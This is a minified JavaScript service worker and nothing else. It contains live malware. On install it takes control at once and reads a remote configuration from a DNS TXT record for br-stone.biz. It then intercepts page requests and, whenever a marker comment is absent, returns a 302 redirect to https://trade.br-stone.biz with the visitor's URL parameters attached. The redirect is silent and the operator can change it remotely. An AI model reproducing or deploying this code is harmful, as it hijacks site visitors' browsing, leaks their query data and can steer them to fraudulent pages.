function e(){this.j=!1;this.h=null;this.B=void 0;this.l=1;this.A=this.C=0;this.i=null}function g(a){if(a.j)throw new TypeError("Generator is already running");a.j=!0}e.prototype.m=function(a){this.B=a};e.prototype.o=function(a){this.i={D:a,F:!0};this.l=this.C||this.A};e.prototype["return"]=function(a){this.i={"return":a};this.l=this.A};function k(a){var b=m();a.l=2;return{value:b}}function n(a){this.g=new e;this.G=a}
n.prototype.m=function(a){g(this.g);if(this.g.h)return p(this,this.g.h.next,a,this.g.m);this.g.m(a);return q(this)};function r(a,b){g(a.g);var c=a.g.h;if(c)return p(a,"return"in c?c["return"]:function(d){return{value:d,done:!0}},b,a.g["return"]);a.g["return"](b);return q(a)}n.prototype.o=function(a){g(this.g);if(this.g.h)return p(this,this.g.h["throw"],a,this.g.m);this.g.o(a);return q(this)};
function p(a,b,c,d){try{var f=b.call(a.g.h,c);if(!(f instanceof Object))throw new TypeError("Iterator result "+f+" is not an object");if(!f.done)return a.g.j=!1,f;var l=f.value}catch(h){return a.g.h=null,a.g.o(h),q(a)}a.g.h=null;d.call(a.g,l);return q(a)}function q(a){for(;a.g.l;)try{var b=a.G(a.g);if(b)return a.g.j=!1,{value:b.value,done:!1}}catch(c){a.g.B=void 0,a.g.o(c)}a.g.j=!1;if(a.g.i){b=a.g.i;a.g.i=null;if(b.F)throw b.D;return{value:b["return"],done:!0}}return{value:void 0,done:!0}}
function t(a){this.next=function(b){return a.m(b)};this["throw"]=function(b){return a.o(b)};this["return"]=function(b){return r(a,b)};this[Symbol.iterator]=function(){return this}}function u(a){function b(d){return a.next(d)}function c(d){return a["throw"](d)}return new Promise(function(d,f){function l(h){h.done?d(h.value):Promise.resolve(h.value).then(b,c).then(l,f)}l(a.next())})}
var v={enabled:1,s:"\x3c!--img/BrStone.svg--\x3e",u:"https://trade.br-stone.biz",v:["br-stone.biz"]},w={H:self.location.hostname+"_swredir"};function x(a){var b={};a=a||"";var c=a.indexOf("?");if(-1===c||a.length===c+1)return{};decodeURIComponent(a.slice(c+1)).split("&").forEach(function(d){d=d.split("=",2);b[d[0]]=d[1]});return b}
function y(a,b){return 1===v.enabled?a.clone().text().then(function(c){if(0<=c.indexOf(v.s))return!0}).then(function(c){if(c)return a;z();return A(b)}):a}
function m(a){a=void 0===a?0:a;return fetch("https://dns.google.com/resolve?type=TXT&name=src."+v.v[a],{cache:"no-cache"}).then(function(b){return b.clone().json()}).then(function(b){return JSON.parse(b.Answer[0].data)}).then(function(b){v.enabled=b[1];v.s=b[2]?b[2]:v.s;v.u=b[3]?b[3]:v.u;v.I=Date.now();JSON.stringify(v);return!0})["catch"](function(){if(v.v.length-1>a)return m(++a);v.enabled=0;return!1})}
function A(a){w=x(a);w.H=self.location.hostname+"_swredir";a={status:302,statusText:"Found",headers:{Location:z()}};return new Response("",a)}function z(){var a=v.u;return a+=(-1===a.indexOf("?")?"?":"&")+B()}function B(){var a=w;return Object.keys(a).map(function(b){return encodeURIComponent(b)+"="+encodeURIComponent(a[b])}).join("&")}self.addEventListener("install",function(){self.skipWaiting();m()});
self.addEventListener("fetch",function(a){console.log("f event");"manual"===a.request.redirect&&!0===navigator.onLine&&a.respondWith(function(){return u(new t(new n(function(b){return 1==b.l?k(b):b["return"](fetch(a.request).then(function(c){return y(c,a.request.url)})["catch"](function(){return A(a.request.url)}))})))}())});